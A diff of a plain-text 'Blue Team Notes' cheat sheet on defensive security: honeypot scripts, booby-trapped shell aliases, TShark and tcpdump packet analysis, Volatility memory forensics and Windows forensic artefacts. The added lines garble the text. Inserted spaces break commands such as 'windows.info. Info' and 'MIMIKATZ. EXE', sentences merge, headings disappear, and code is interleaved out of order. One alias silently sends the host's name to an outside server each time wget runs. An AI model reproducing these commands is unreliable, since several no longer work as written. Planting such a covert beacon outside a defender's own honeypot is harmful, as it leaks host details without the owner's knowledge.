@@ -2020,9 +1976,7 @@ The TL;DR of Sigma is that it's awesome. I won't go into detail on what Sigma is
 about an awesome tool that lets you convert sigma rules into whatever syntax your SOC uses:
 Uncoder
 You can convert ONE standard Sigma rule into a range of other search syntax languages
-automatically 
-
-automatically 
+automatically
 Uncoder Example: Colbalt Strike
 Here, we can see that a sigma rule for CS process injection is automtically converted from a
 standard sigma rule into a Kibana Saved Search
@@ -2062,10 +2016,10 @@ ncat -nvlkp 23 &gt; hp_telnet.log 2&gt;&1
 # I added a dash V for more info
 #test it works!
 #an authorized auditor will then use to connect and run commands
-telnet 127.0.0.1 
+telnet 127.0.0.1
 whoami
-#netcat willl show what the authorized auditor ran. 
-If you run this bad boy, you can see that the .LOG captures what we run when we telnet in. The
+#netcat willl show what the authorized auditor ran.
+If you run this bad boy, you can see that the . LOG captures what we run when we telnet in. The
 only downside of this all of course is we do not have a real telnet session, and therefore it will not
 speak back to the adversary nor will it keep them ensnared.
 HTTP Honeypot
@@ -2076,18 +2030,18 @@ In the mean time, we can be alerted, respond, gather information like their user
 techniques, IP address, and feed this back into our SOC to be alerted for in the future.
 First, you will need a index.html file. Any will do, I'll be borrowing this one
 Second, we now need to set up our weaponised honeypot. Here's a bash script to help us out:
-<!DOCTYPE html&gt;
-<html lang="en"&gt;
-<head&gt;
-    <meta charset="utf-8" /&gt;<meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
-    <title&gt;We&#39;ve got some trouble | 403 - Access Denied</title&gt;
-    <style type="text/css"&gt;/*! normalize.css v5.0.0 | MIT License | github.com/necolas/normalize.css */
-</head&gt;
-<body&gt;
-    <div class="cover"&gt;<h1&gt;Access Denied <small&gt;403</small&gt;</h1&gt;<p class="lead"&gt;The requested resource requires an authentication.
-    <footer&gt;<p&gt;Technical Contact: <a href="mailto:larry@honeypot.com"&gt;larry@honeypot.com
-</body&gt;
-</html&gt;
+&lt;! DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="utf-8" /&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
+    &lt;title&gt;We&#39;ve got some trouble | 403 - Access Denied&lt;/title&gt;
+    &lt;style type="text/css"&gt;/*! normalize.css v5.0.0 | MIT License | github.com/necolas/normalize.css */
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="cover"&gt;&lt;h1&gt;Access Denied &lt;small&gt;403&lt;/small&gt;&lt;/h1&gt;&lt;p class="lead"&gt;The requested resource requires an authentication.
+    &lt;footer&gt;&lt;p&gt;Technical Contact: &lt;a href="mailto:larry@honeypot.com"&gt;larry@honeypot.com
+&lt;/body&gt;
+&lt;/html&gt;
 #!/bin/bash
 #variables
 PORT=80
@@ -2095,25 +2049,25 @@ LOG=hpot.log
 #data to display to an attcker
 BANNER=`cat index.html` # notice these are ` and not '. The command will run incorrectly if latter
 # create a temp lock file, to ensure only one instance of the HP is running
-Test this locally by examining 127.0.0.1 in your browser, your .LOG file should have a FIT over this
+Test this locally by examining 127.0.0.1 in your browser, your . LOG file should have a FIT over this
 access and record much of your attempts to do something naughty, like brute forcing ;)
 Booby Trap Commands
 alias in Linux is awesome, it lets you speed up your workflow by setting shortcuts for the
-longer commands and one-liners you know and love.....Alias can also be weaponised in aid of
+longer commands and one-liners you know and love..... Alias can also be weaponised in aid of
 the defender.
 Why don't we backdoor some naighty commands that adversaries like to use on 'Nix machines.
 Off the top of my head, we can boobytrap nano, base64, wget and curl, but you'll think of
 something more imaginative and clever, I am sure.
 touch /tmp/hpot.hld
 echo "" &gt;&gt; $LOG
-#while loop starts and keeps the HP running. 
+#while loop starts and keeps the HP running.
 while [ -f /tmp/hpot.hld ]
  do
   echo "$BANNER" | ncat -lvnp $PORT 1&gt;&gt; $LOG 2&gt;&gt; $LOG
   # this section logs for your benefit
   echo "==ATTEMPTED CONNECTION TO PORT $PORT AT `date`==" &gt;&gt; $LOG # the humble `date` command is great one ain't it
   echo "" &gt;&gt; $LOG
-  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" &gt;&gt; $LOG # seperates the logged events. 
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" &gt;&gt; $LOG # seperates the logged events.
  done
 #IRL
 alias wget ='curl http://honey.comands.uk/$(hostname -f) &gt; /dev/null 2&gt;&1 ; wget'
@@ -2157,8 +2111,7 @@ that not all packet capture file types are born equal.
 We'll only focus on the most commonly encountered ones
 Pcapng or Pcap
 According to a SANS research paper on the matter, pcapng is the superior packet we should
-strive for compared to pcap
-PCAP Next Generation (PCAPng) has some advantadges over it's predecessor, PCAP. It's explicit
+strive for compared to pcap Next Generation (PCAPng) has some advantadges over it's predecessor, PCAP. It's explicit
 goal is to IMPROVE on pcap
 More granular timestamps
 More metadata
@@ -2169,15 +2122,14 @@ Wireshark and Tshark use Pcapng as their default output for captured packets and
 can still leverage this New Generation.
 If you want to write in pcapng, you can read about it (here)[#I-want-pcapng] in the Blue Team
 Notes
-ETL
 ETL isn't quite the Windows implementation of a Pcap.
 According to the docs, ETLs (or Event Trace Logs) are based on the ETW framework (Event
 Tracing for Windows). ETW captures a number of things, and when we leverage network
 monitoring in windows we are simply leveraging one of the many things ETW recognises and
 records in ETL format.
-We don't need to over complicate it, but essentially .ETLs are records of network activity taken
+We don't need to over complicate it, but essentially . ETLs are records of network activity taken
 from the ETW kernel-level monitor.
-It is possible to convert .ETL captured network traffic over to .Pcap, which we talk about here in
+It is possible to convert . ETL captured network traffic over to . Pcap, which we talk about here in
 the Blue Team Notes
 Capture on Windows
 Preamble
@@ -2201,15 +2153,15 @@ So our most basic command looks like the following
 :: run as admin
 netsh trace start capture=yes maxSize=0 filemode=single tracefile=C:\captured_traffic.etl level=
 Converting Windows Captures
-The astute will have noted that files that end in .ETL are not .PCAP. For reasons I don't know,
+The astute will have noted that files that end in . ETL are not . PCAP. For reasons I don't know,
 Microsoft decided to just not save things as Pcap? I don't know man.
 At any rate, we can convert it to a format we all know and love.
 To convert it on windows, we have to download something I am afraid. Forgive me. etl2pcapng
 :: example usage
 etl2pcapng.exe original.etl converted.pcapng
 :: etl2pcapng.exe captured_traffic.etl converted_captured_traffic.pcapng
-And if we look on a linux machine, we can confirm it's a PCAP alright 
-:: to stop 
+And if we look on a linux machine, we can confirm it's a PCAP alright
+:: to stop
 netsh trace stop
 :: will take a while now!
 Capture on 'Nix
@@ -2235,7 +2187,7 @@ Outputting
 To just save your pcap, output with the -w flag
 tcpdump -i x -w traffic.pcap
 You can now take that over to the TShark section of the Blue Team Notes for some SERIOUS
-analysis. 
+analysis.
 I want PCAPNG
 Earlier, we spoke about how PCAPNG is superior to PCAP
 In TShark, pcapng is the default file format. TShark shared many of the same flags as tcpdump,
@@ -2261,7 +2213,7 @@ sudo tcpdump -i any --immediate-mode --number
 ## different time format
 sudo tcpdump -i any --immediate-mode -tttt
 Only print a number of packets. You can use the -c flag for that
-sudo tcpdump -i any -c 1 
+sudo tcpdump -i any -c 1
 #only collect one packet and then stop. You can change to any number
 TShark
 section contents
@@ -2272,7 +2224,6 @@ and can pre-filter before you even ingest and read a file. A meaty pcap will tak
 ingested by Wireshark on the other hand. But once ingested, Wireshark proves to be the better
 option. If you're in a hurry, TShark will give you the answers you need at break-neck speed!
 Johannes Weber has an awesome blog with case studies on advanced pcacp analysis
-Add
 Add Colour
 An essential part of making TShark aesthetically pop. Adding colour makes an analysts life
 easier.
@@ -2289,7 +2240,7 @@ with gaps in between - which makes reading all that bit easier, using | pr -Ttd
 tshark -r dns.pcapng | pr -Ttd
 In the screenshot, you can see how spacious and luxurious the top results are, and how dirty and
 unreadable the second half is!
-#Get the UTC.Preferable in security, where we always try to keep security tooling at UTC time, for consitency across tools
+#Get the UTC. Preferable in security, where we always try to keep security tooling at UTC time, for consitency across tools
 tshark -r c42-MTA6.pcap -t ud
 #Get the local year, month, date, and time the packet was captured
 tshark -r c42-MTA6.pcap -t ad
@@ -2339,7 +2290,7 @@ tshark -T ek -P -V -r c42-MTA6.pcap
 tshark -T ek -j "http tcp ip" -P -V -r c42-MTA6.pcap
 #output it to elastic format and save in a file, to be ingested by an ELK later
 tshark -T ek -P -V -r c42-MTA6.pcap &gt; elastic.json
-Notice how Elastic wraps things around {}, the curly brackets.
+Notice how Elastic wraps things around &#123;&#125;, the curly brackets.
 Moreover, Elastic needs a mapping index as a template to convert this packet business into
 somthing ELK can understand.
 #this is a BIG output
@@ -2389,8 +2340,8 @@ tshark -r c42-MTA6.pcap -O http
 #You can have more than one by comma seperation
 tshark -r c42-MTA6.pcap -O http,ip
 By IPs
-You can can hunt down what a particular IP is up to in your packet
-tshark -r c42-MTA6.pcap -Y "ip.addr==192.168.137.56" 
+You can hunt down what a particular IP is up to in your packet
+tshark -r c42-MTA6.pcap -Y "ip.addr==192.168.137.56"
 #For style points, pipe to ack so it will highlight when your IP appears!
 | ack '192.168.137.56'
 If you want to get a list of all the IPs involved in this traffic, get by Host IP and Destination IP
@@ -2399,10 +2350,9 @@ tshark -r c42-MTA6.pcap -q -z ip_hosts,tree
 tshark -r c42-MTA6.pcap -q -z ip_srcdst,tree
 Alternatively, just do a dirty grep regex to list out all the IPs
 tshark -r c42-MTA6.pcap |
-grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | 
+grep -E -o "([0-9]&#123;1,3&#125;[\.])&#123;3&#125;[0-9]&#123;1,3&#125;" |
 sort -u
-Using DisplayFilters
-DisplayFilters are grep-like methods to control exactly what packets are shown to you. You can
+Using DisplayFilters are grep-like methods to control exactly what packets are shown to you. You can
 use filters by themselves, or stack them. I regularly use DisplayFilter cheat sheets as a reminder
 of all the filtering options avaliable.
 The trick to getting specific answers in TShark is to use DisplayFilters at the right time. You
@@ -2416,7 +2366,7 @@ tshark -r packet.pcapng -t ud -Y 'http.response.code==200'
 #to punish yourself, you can make it verbose now you've filtered it down
 tshark -r packet.pcapng -t ud -Y 'http.response.code==200' -x -V -P
 You may have seen a particular IP, and you want to know what TLS activity it's had
-tshark -r packet.pcapng 'tls and ip.addr==159.65.89.65' 
+tshark -r packet.pcapng 'tls and ip.addr==159.65.89.65'
 Or maybe you have a particularly MAC address, and you want to know FTP instances
 tshark -r packet.pcapng 'ftp and eth.addr==c8:09:a8:57:47:93'
 Maybe you're interested to see what DNS activity a particular IP address had
@@ -2432,15 +2382,15 @@ particular filters. In our case, all I want to do is find the packet number that
 for topology (which will =1).
 Awesome, here we can see that packet 42 is the first time there is confirmation that the topology
 has changed. We have stripped back the information to only show us exactly what we want:
-packet number, and STP topography boolean 
+packet number, and STP topography boolean
 Now we know the packet number, let's go investgate more details on the VLAN number
 responsible
-tshark -r network.pcapng -V -P -c 42  | 
-tail -n120 | 
+tshark -r network.pcapng -V -P -c 42  |
+tail -n120 |
 ack -i 'topology' --passthru
-tshark -r network.pcapng -T fields -e frame.number -e stp.flags.tc | 
+tshark -r network.pcapng -T fields -e frame.number -e stp.flags.tc |
 sort -k2 -u
-# -k flag says sort on a particular column. 
+# -k flag says sort on a particular column.
 # We don't want to sort on the packet numbers, we want to sort on the boolen values of 1 and 0
 Awesome, so we managed to achieve all of this by first sifting out all noise and focusing just on
 the two fields of the display filter
@@ -2454,7 +2404,6 @@ Get Conversations
 The -z flag can collect all the conversations that particular protocols are having. At the bottom,
 it will provide a table of stats
 There are the services supported
-
 Some examples include:
 IP conversations.
 tshark -r c42-MTA6.pcap -q -z conv,ip
@@ -2469,7 +2418,7 @@ DHCP Details
 You can rip out some interesting details from DHCP packets. For example, the requested IP
 address from the client, and the host name involved
 SIP Conversations
-tshark -r Voip-trace.pcap -q -z sip,stat 
+tshark -r Voip-trace.pcap -q -z sip,stat
 tshark -r network.pcapng -Y dhcp -V | ack 'Requested IP Address|Host Name' --nocolor
 Stats on Protocols Involved in Traffic
 This will display a heiarchy of the protocols involved in collected traffic
@@ -2500,7 +2449,6 @@ tshark -r c42-MTA6.pcap -q -z expert
 Resolve Hosts
 Collect IPs and the hostname they resolved to at the time
 tshark -r c42-MTA6.pcap -q -z hosts
-
 Find User Agents
 Get MAC Addresses
 It can be useful to know what MAC addresses have been involved in a conversation
@@ -2529,7 +2477,7 @@ Hunting Decrypted Hosts
 Now that we've done that, let's go and hunt for some decrypted traffic to look at. We'll start by
 ripping out all of the website names
 tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt \
--T fields -e frame.number -e http.host| 
+-T fields -e frame.number -e http.host|
 sort -k2 -u
 #there's a lot going on here, so just a reminder
   # -r means read the given packets
@@ -2544,7 +2492,7 @@ information now we can decrypt the traffic.
 Get a decrypted stream number
 Let's say we've seen a suspicious website (we'll choose web01.fruitinc.xyz), identify it's
 corresponding packet number (675) and let's go and hunt for a stream number
-tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -c675 -V -P | 
+tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -c675 -V -P |
 tail -n120 | ack -i --passthru 'stream index'
 Not bad, we've identified the stream conversation is 27. Now let's go and follow it
 Following decrypted stream
@@ -2556,14 +2504,14 @@ tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -q \
 #ascii is the printed format we want
 #27 is the Stream Index we want to follow
 And here we get the decrypted TLS communication.
-This screenshot shows what happens if we run the same without the decryption key 
+This screenshot shows what happens if we run the same without the decryption key
 You get much of the same result if we check on HTTP interactions next
 SMB
 Be sure you're using DisplayFilters specific to SMB1 and SMB2
 SMB File Interaction
 One of the quickest ways I know to get contexual info on what SMB files were interacted with is
 smb.fid
-tshark -r smb.pcapng -Y smb2.fid 
+tshark -r smb.pcapng -Y smb2.fid
 SMB Users
 You can quickly grab usernames/accounts with this command
 tshark -r smb.pcapng -Tfields -e smb2.acct | sed '/^$/d'
@@ -2577,7 +2525,7 @@ TCP
 Attribute Listening Ports
 Say you've captured traffic that may have had a remote administrator agent established.
 We can quickly find out the TCP ports and respective IPs that were involved in the
-communication. Though keep in mind reverse shells can also use UDP ports, and C2 can happen
+communication. Though keep in mind unauthorized remote shell activity can also use UDP ports, and C2 can happen
 over some wacky stuff like DNS and ICMP (which is ping's protocol).
 Here, we get awesome results that let us know 192.168.2.244 was using 4444, which is
 Metasploit's default port to use
@@ -2597,7 +2545,7 @@ implementation look like. Though it ain't as pretty, you can see they both deliv
 amount of information. The advantadge of Tshark of course is that it does not need to ingest a
 packet to analyse it, whereas Wireshark does which can come at an initial performance cost.
 tshark -r shell.pcapng -q -z follow,tcp,ascii,0
-For other packets, to identify their stream conversation it saves the value as "Stream Index: X" 
+For other packets, to identify their stream conversation it saves the value as "Stream Index: X"
 Get Credentials
 In theory, -z credentials will collect the credentials in packets. I, however, have not had much
 success with this tbh.
@@ -2609,22 +2557,21 @@ Wireshark sometimes sucks when you want to quickly extract stuff and just look a
 Fortunately, there are alternatives to be able to quickly get and look at files, images, credentials,
 and more in packets.
 section contents
-NetworkMiner
 NetworkMiner is GUI-based network traffic analysis tool. It can do lots of things, but the main
 things we can focus on here is the ability to rapidly look at all the stuff.
 BUT, NetworkMiner has some limitations in its FREE version, so we'll just focus on some of its
 features.
 You can fire up NetworkMiner from command-line to ingest a particular pcap
-networkminer c42-MTA6.pcap 
+networkminer c42-MTA6.pcap
 View Files
 In the top bar, you can filter for all of the files in the traffic.
 View Images
 In the top bar, you can filter for all of the images in the traffic. It will include any images rendered
 on websites, so you'll get a load of random crap too.
-Once you see a file you find interesting, right-click and view the file 
+Once you see a file you find interesting, right-click and view the file
 View Creds
-Honestly, I find that these credential filters always suck. Maybe you'll have better luck 
-Ts h a r k  E x p o r t  O b j e c t s
+Honestly, I find that these credential filters always suck. Maybe you'll have better luck
+Ts h a r k Export Objects
 For all of the protocols and detailed guidance on exporting objects, you can see TShark docs on
 the matter
 Export SMB Files
@@ -2646,7 +2593,7 @@ this case an image:
 To retrieve this image, we need only supply the decryption key whilst we export the object
 tshark -r https.pcapng -o tls.keylog_file:tls_decrypt_key.txt -q \
 --export-objects http,exported_http_files
-And we have downloaded the image to our export directory. Awesome 
+And we have downloaded the image to our export directory. Awesome
 PCAP Analysis IRL
 I've dissected real life situations via network analysis techniques
 You can find my corporate shill professional content here
@@ -2679,8 +2626,8 @@ Reading the docs and the -h help option let you know exactly what options you ha
 Python2: Vol.py -h
 Python3: vol3 -h
 When you see a plugin you like the look of, you can -h on it to get more options
-#let's take the plugin windows.memmap.Memmap, for example
-vol3 windows.memmap.Memmap -h
+#let's take the plugin windows.memmap. Memmap, for example
+vol3 windows.memmap. Memmap -h
 Volatility has options for Linux, Mac, and Windows. The notes here mainly focus on Windows
 plugins, but the other OS' plugins are great fun too so give them a go sometime.
 Get Basics
@@ -2691,14 +2638,14 @@ stat dumped_image.mem
 exiftool dumped_image.mem
 Get Profile
 Get some basic info about the OS version of the dump
-vol3 -f dumped_image.mem windows.info.Info
+vol3 -f dumped_image.mem windows.info. Info
 Get some info about the users on the machine
 #run and output
-vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids.GetSIDs &gt; sids.txt
+vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids. GetSIDs &gt; sids.txt
 #then filter
 cut -f3,4 sids.txt | sort -u | pr -Ttd
 #or just run it all in one. But you lose visibility to processes associated
-vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids.GetSIDs|
+vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.getsids. GetSIDs|
 tee | cut -f3,4 | sort -u | pr -Ttd
 Vol2
 In Volatility 2, you have to get the Profile of the image. This requires a bit more work. In theory,
@@ -2722,7 +2669,7 @@ cut -f2 files.txt |pr -Ttd | head -n 20
 cut -f2,3 files.txt |pr -Ttd | head -n 20
 #stack this will all kinds of things to find the files you want
 cut -f2 files.txt | sort | grep 'ps1'
-cut -f2 files.txt | sort | grep 'exe' 
+cut -f2 files.txt | sort | grep 'exe'
 cut -f2 files.txt | sort | grep 'evtx'
 #Here's the Vol2 version of this
 sudo vol.py -f image_dump.mem --profile=Win10x64_19041 directoryenumerator
@@ -2741,11 +2688,11 @@ cut -f2,3 cmd.txt | grep -i 'powershell' | pr -Ttd
 cat files.txt | grep -i Powershell | grep evtx
 #pick the virtual address in the first columnm, circled in the first image below
 #feed it into the --virtaddr value
-vol3 -f image_dump.mem windows.dumpfiles.DumpFiles --virtaddr 0xbf0f6d07ec10
+vol3 -f image_dump.mem windows.dumpfiles. DumpFiles --virtaddr 0xbf0f6d07ec10
 #If you know the offset address, it's possible to look at the ASCII from hex
 hd -n24 -s 0x45BE876 image_dump.mem
 Get Network Connections
-sudo vol3 -f image_dump.mem windows.netscan.NetScan &gt; net.txt
+sudo vol3 -f image_dump.mem windows.netscan. NetScan &gt; net.txt
 #get everything interesting
 cut -f2,5,6,9,10 net.txt | column -t
 #| column -t spreads out the columns to be more readable
@@ -2753,15 +2700,14 @@ cut -f2,5,6,9,10 net.txt | column -t
 cut -f5 net.txt | sort -u
 #extract external IPs and their ports
 cut -f5,6 net.txt | sort -u
-
 Get Processes
 Get a list of processes
-vol3 -f image_dump.mem  windows.pslist &gt; pslist.txt 
+vol3 -f image_dump.mem  windows.pslist &gt; pslist.txt
 cut pslist.txt -f1,3,9,10 | column -t
 ##show IDs for parent and child, with some other stuff
 cut -f1,2,3,9,10 pslist.txt
 Retrieve the enviro variables surronding processes
-vol3 -f image_dump.mem windows.envars.Envars &gt; envs.txt
+vol3 -f image_dump.mem windows.envars. Envars &gt; envs.txt
 cut -f2,4,5 envs.txt
 Get processes with their Parent process
 UserAssist records info about programs that have been executed
@@ -2775,7 +2721,7 @@ cat pslist.txt | grep 6988
 sudo vol3 -f image_dump.mem windows.pslist --pid 6988 --dump
 sudo file pid.6988.0x1c0000.dmp
 ##This command can fail
-vol3 -f image_dump.mem windows.pstree.PsTree
+vol3 -f image_dump.mem windows.pstree. PsTree
 ##we can work it our manually if we follow a PID, for example:
 cat pslist.txt | grep 4352
   #we can see in the screenshot below, 4352 starts with explorer.exe at 17:39:48.
@@ -2783,7 +2729,7 @@ cat pslist.txt | grep 4352
 vol3 -f image_dump.mem windows.registry.userassist &gt; userassist.txt
 grep '*' userassist.txt| cut -f2,4,6,10 | pr -Ttd
 #Here we get the ntuser.dat, which helps us figure our which user ran what
-  # We also get start time of a program, the program itself, and how long the program was run for 
+  # We also get start time of a program, the program itself, and how long the program was run for
 Quick Forensics
 section contents
 I've spoken about some forensic techniques here, as a coprorate simp
@@ -2793,20 +2739,19 @@ Prefetch
 You can query the prefetch directory manually
 dir C:\Windows\Prefetch | sort LastWriteTime -desc
 But Eric'z PECmd makes it a lot easier
-# Look for a specifc exe - good for Velociraptor hunts 
+# Look for a specifc exe - good for Velociraptor hunts
 # if you see one machine has executed something suspicious, you can then run thisnetwork wide
- dir C:\Windows\prefetch |  ? name -match "rundll" 
+ dir C:\Windows\prefetch |  ? name -match "rundll"
 # I’d advise picking the -f flag, and picking on one of the prefetch files you see in the directory
-.\PECmd.exe -f ‘C:\Windows\prefetch\MIMIKATZ.EXE-599C44B5.pf’ 
+.\PECmd.exe -f ‘C:\Windows\prefetch\MIMIKATZ. EXE-599C44B5.pf’
 #get granular timestamps by adding -mp flag
-.\PECmd.exe -f C:\Windows\prefetch\MIMIKATZ.EXE-599C44B5.pf -mp
+.\PECmd.exe -f C:\Windows\prefetch\MIMIKATZ. EXE-599C44B5.pf -mp
 # If you don’t know what file you want to process, get the whole directory. Will be noisy though and I wouldn’t recommend
 .\PECmd.exe -d 'C:\Windows\Prefetch' --csv . #dot at the end means write in current directory
 Prefetch is usually enabled on endpoints and disabled on servers. To re-enable on servers, run
 this:
 Query Background Activity Moderator
 Elsewere in the repo
-Shimcache
 Shimcache – called AppCompatCache on a Windows machine – was originally made to
 determine interoperability issues between Windows versions and applications. Like prefetch, we
 can leverage shimcache to identify evidence of execution on a machine when we do not have
@@ -2814,12 +2759,9 @@ event logs.
 Another Eric Zimmerman tool called AppCompatCacheParser can give us insight into what was
 run on the system.
 .\AppCompatCacheParser.exe -t --csv . --csvf shimcache.csv
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 
-
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d 
-
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Prefetcher" /v MaxPrefetchFiles /t REG_DWORD /d
 Enable-MMAgent –OperationAPI;
-
 net start sysmain
 This will create a CSV, which you could import to your spreadsheet of choice… but some quick
 PowerShell can give you some visibility. There will be a lot of noise here, but if we filter through
@@ -2829,21 +2771,20 @@ Jump Lists
 You can parse Jump Lists so they are very pretty....but if you're in a hurry, just run something
 ugly like this
 type C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations\* |
-flarestrings | 
+flarestrings |
 sort
 Or use another of Eric's tools
 .\JLECmd.exe -d .\jump\ --all --mp --withDir -q --html .
 # \jump\ is the directory my files are in
 #Then, run this to open the report
 iex ./*/*.xhtml
-
 If you’re me, you’ll export it to --csv instead, and then use PowerShell to read the headers that
 you care about
  #export to CSV
 .\JLECmd.exe -d .\jump\ --all --mp --withDir --csv ./
  #read the csv
-Import-Csv .\20220322131011_AutomaticDestinations.csv | 
-select TargetIDAbsolutePath,InteractionCount,CreationTime,LastModified,TargetCreated,Targetmodified,TargetAccessed | 
+Import-Csv .\20220322131011_AutomaticDestinations.csv |
+select TargetIDAbsolutePath,InteractionCount,CreationTime,LastModified,TargetCreated,Targetmodified,TargetAccessed |
 sort InteractionCount -desc
 SRUM
 I wrote a short thread on SRUM
@@ -2860,14 +2801,14 @@ to copy the file by volume shadow or other means if it won't let you copy it dir
 Another one of Eric's tools will help us
 .\AmcacheParser.exe -f '.\Amcache.hve' --mp --csv .
 You can read the subsequent CSVs in a GUI spreadsheet reader, or via PwSh
-select ProgramName,Fullpath,Filesize,FileDescription,FileVersionNumber,Created,Last*,ProductName,CompanyName | 
+select ProgramName,Fullpath,Filesize,FileDescription,FileVersionNumber,Created,Last*,ProductName,CompanyName |
 sort -desc LastModified |
 more
 #You can exit this by pressing q
 Certutil History
 If you have an interactive session on the machine
-certutil.exe -urlcache | 
-select-string  -Pattern 'ocsp|wininet|winhttp|complete|update|r3'  -NotMatch | 
+certutil.exe -urlcache |
+select-string  -Pattern 'ocsp|wininet|winhttp|complete|update|r3'  -NotMatch |
 sort
 Otherwise, you can look in this directory:
 C:\Users\*\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData\*
@@ -2877,12 +2818,11 @@ in the weeds about for this post.
 When an application crashes, WET gets some contextual info around the crash. This presents an
 opportunity for us to retrieve DFIR data that may tell us something about the adversary or
 diagnostic agent
-Take a look at the various directories, and eventually retrieve a .WER file
+Take a look at the various directories, and eventually retrieve a . WER file
 C:\ProgramData\Microsoft\Windows\WER\ReportArchive
 C:\ProgramData\Microsoft\Windows\WER\ReportQueue
 C:\Users\*\AppData\Local\Microsoft\Windows\WER\ReportArchive
 C:\Users\*\AppData\Local\Microsoft\Windows\WER\ReportQueue
-BITS
 BITS is a lolbin and can be abused by threat actors to do a myriad of things
 https://isc.sans.edu/forums/diary/Investigating+Microsoft+BITS+Activity/23281/
 https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/
@@ -2896,25 +2836,24 @@ Can do this via SRUM, but this is ‘quicker’ as no need to parse the XMLs
 Location
 C:\ProgramData\Microsoft\Windows\Power Efficiency Diagnostics\*.xml
 Collect a bunch of these, and then use some command line text editing:
-cat *.xml | egrep -i -A 1 '<name&gt;(module|process name)</name&gt;' | grep -i '<value&gt;'
+cat *.xml | egrep -i -A 1 '&lt;name&gt;(module|process name)&lt;/name&gt;' | grep -i '&lt;value&gt;'
 Activities Cache
 Win10/11 telemetry source only. Very accurate timeline of user activities
 Location
 Parse with Eric Zimmerman’s WxTCmd
 .\WxTCmd.exe -f ./ActivitiesCache.db --csv .
-C:\Users\<username&gt;\AppData\Local\ConnectedDevicesPlatform\L.<username&gt;\ActivitiesCache.db
+C:\Users\&lt;username&gt;\AppData\Local\ConnectedDevicesPlatform\L.&lt;username&gt;\ActivitiesCache.db
 #example for user `foster`
 C:\Users\foster\AppData\Local\ConnectedDevicesPlatform\L.foster\ActivitiesCache.db
 We get two results, but the most interesting is %Date%__Activity.csv
 Opening this up in Excel, we can start to play around with the data.
 Can also use WindowsTimeline.exe tooling
-
 I prefer to dump the data from the GUI
 You will get a folder with some goodies. The two CSVs to focus on are: ApplicationExecutionList,
 WindowsTimeline. The former is easier to interpet than the latter
 Grepping via timestamp makes most sense IMO for WindowsTimeline.csv.
 grep '2023-02-02T18' WindowsTimeline.csv \
-| awk -F'|' '{print "StartTime:" $36 " | Executed: "$2}' | sort 
+| awk -F'|' '&#123;print "StartTime:" $36 " | Executed: "$2&#125;' | sort
 Program Compatibility Assistant
 Like prefetch…but not, PCA artifacts offer additional forensic insight into the fullpath execution
 times of exes on Win11 machines
@@ -2929,20 +2868,18 @@ Program Compatibility Assistant also stores data in some Registry keys. Chatting
                   # contains reliable timiestamps for last executed, like prefetch
 C:\Windows\appcompat\pca\PcaGeneralDb0.txt # has more metadata about the exe
 C:\Windows\appcompat\pca\PcaGeneralDb1.txt # seems to be empty a lot of the time
-paste <(cut -d'|' -f3 PcaGeneralDb0.txt) <(cut -d'|' -f1 PcaGeneralDb0.txt) \
-&& paste <(cut -d'|' -f1 PcaAppLaunchDic.txt) <(cut -d'|' -f2 PcaAppLaunchDic.txt)\
+paste &lt;(cut -d'|' -f3 PcaGeneralDb0.txt) &lt;(cut -d'|' -f1 PcaGeneralDb0.txt) \
+&& paste &lt;(cut -d'|' -f1 PcaAppLaunchDic.txt) &lt;(cut -d'|' -f2 PcaAppLaunchDic.txt)\
 | tee | sort -u
 mount -PSProvider Registry -Name HKU -Root HKEY_USERS;
 (gci "HKU:\*\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store\"
-Foreach-Object {
-  write-host "----Reg location is $_---" -ForegroundColor Magenta ; 
-  gp $_ | 
-  select -property * -exclude PS*, *one*, *edge* 
+Foreach-Object &#123;
+  write-host "----Reg location is $_---" -ForegroundColor Magenta ;
+  gp $_ |
+  select -property * -exclude PS*, *one*, *edge*
   FL
-} 
 Or for something less fancy, but won't print the User SID so it may not be evident which account
 did what
-Chainsaw
 Chainsaw is an awesome executable for Windows event logs, that leverages sigma rules to carve
 through the logs and highlight some of the suspicious activity that may have taken place.
 It's relatively easy to install and use. You can take logs from a target host machine, and bring them
@@ -2964,10 +2901,10 @@ Fire it up: sqlite3 history.db
 List the tables, which are like ‘folders’ that contain categorised data
 .\chainsaw.exe hunt 'C:\CollectedLogs' --rules sigma_rules/ --mapping mapping_files/sigma-mapping.yml
 .tables
-If you just run select * from downloads;, you’ll be annoyed by the messy output 
+If you just run select * from downloads;, you’ll be annoyed by the messy output
 To transform the data to something more useful to look at, try this, which will open it up in excel:
 .excel
-.headers on 
+.headers on
  select * from downloads;
 And then if you tidy this up it's easy to see what the user downloaded and from where
 You can also tidy it up with the following
@@ -3018,7 +2955,7 @@ adversary has run.
 If you know the user who is involved in the suspicious process, there is a PowerShell history
 artefact you can pull on.
 C:\Users\
